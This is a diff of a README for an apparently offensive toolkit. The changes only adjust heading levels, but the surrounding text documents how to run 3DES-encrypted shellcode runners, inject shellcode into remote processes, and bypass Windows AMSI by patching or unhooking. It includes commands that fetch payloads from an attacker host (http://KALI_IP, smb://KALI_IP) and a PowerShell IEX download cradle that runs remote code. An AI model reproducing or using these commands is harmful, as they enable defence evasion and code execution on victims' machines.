@@ -147,7 +147,7 @@ Password, Salt and IV are static values but you can modified them as you need.
 - **InitialVector**: SBFTWSDXBYVOEMTD
 
 
-#### 1.1.1 Execution of des_decryptor.exe (Needs the path of Shellcode Runner)
+### 1.1.1 Execution of des_decryptor.exe (Needs the path of Shellcode Runner)
 The executable **des_decryptor.exe** doesn't contain a shellcode in it. For this reason, we have to provide a shellcode runner on command-line. There are two 3DES encrypted Shellcode runners that you can put either to a Web or an SMB Server:
 - des_decryptor_embedded.exe (It will inject the shellcode into the remote process that you have provided in the ```line 11 of apophis.sh```)
 - des_decryptor_embedded_marshal.exe (It will inject the shellcode into ```des_decryptor.exe```)
@@ -166,7 +166,7 @@ cmd> des_decryptor.exe http://KALI_IP/des_decryptor_embedded_marshal.exe
 cmd> des_decryptor.exe smb://KALI_IP/des_decryptor_embedded_marshal.exe
 ```
 
-#### 1.1.2 Execution of des_decryptor_embedded.exe
+### 1.1.2 Execution of des_decryptor_embedded.exe
 The executable ```des_decryptor_embeded.exe``` embeds the shellcode in base64, which before was ecrypted with ```TripleDESEncryptor.ps1```. Doesn't need command-line arguments for the execution. 
 
 ```
@@ -181,7 +181,7 @@ It will inject the shellcode into the remote process that you have provided in t
 cmd> des_decryptor_embedded.exe
 ```
 
-#### 1.1.3 Execution of des_decryptor_embedded_marshal.exe
+### 1.1.3 Execution of des_decryptor_embedded_marshal.exe
 The executable ```des_decryptor_embedded_marshal.exe``` embeds the shellcode in base64, which before was ecrypted with ```TripleDESEncryptor.ps1```. Doesn't need command-line arguments for the execution. 
 
 ```
@@ -206,7 +206,7 @@ Nice resource to have:
 - https://amsi.fail/ 
 
 
-#### 1.2.1 Method 1 (Patching)
+### 1.2.1 Method 1 (Patching)
 The execution of 1st method (Patching) is straight forward and uses well-known methodologies.
 
 ```
@@ -226,7 +226,7 @@ You can copy the ```payloads/AMSI/shellcode_runner.txt``` to your web server as 
 powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://<IP>/shellcode_runner.html')); 
 ``` 
 
-#### 1.2.2 Method 2 (Unhooking)
+### 1.2.2 Method 2 (Unhooking)
 To unhook AMSI, I've used the project by **jfmaes - AmsiHooker** (https://github.com/jfmaes/AmsiHooker) and I've done some small modifications. When AmsiHooker executable will launched, it will download the Shellcode Runner from your web server and it will reflectively execute it.
 
 **Steps**
